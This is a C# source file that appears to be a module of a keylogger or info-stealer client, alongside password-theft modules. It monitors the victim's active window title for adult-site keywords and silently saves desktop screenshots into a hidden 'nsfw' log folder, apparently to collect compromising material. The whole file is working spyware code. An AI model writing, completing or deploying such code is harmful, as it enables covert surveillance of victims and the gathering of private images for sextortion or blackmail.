using System;
using System.IO;
using System.Threading;
using Client.Modules.Manager;
using Client.Modules.Passwords.Helpers;
using Client.Modules.Passwords.Targets.System;

namespace Client.Modules.Keylogger;

internal sealed class PornDetection
{
	private static string LogDirectory = Path.Combine(Paths.InitWorkDir(), "logs\\nsfw\\" + DateTime.Now.ToString("yyyy-MM-dd"));

	public static void Action()
	{
		if (Detect())
		{
			SendPhotos();
		}
	}

	private static bool Detect()
	{
		string[] pornServices = Config.PornServices;
		foreach (string value in pornServices)
		{
			if (WindowManager.ActiveWindow.ToLower().Contains(value))
			{
				return true;
			}
		}
		return false;
	}

	private static void SendPhotos()
	{
		string text = LogDirectory + "\\" + DateTime.Now.ToString("hh.mm.ss");
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		Thread.Sleep(3000);
		DesktopScreenshot.Make(text);
		Thread.Sleep(12000);
	}
}
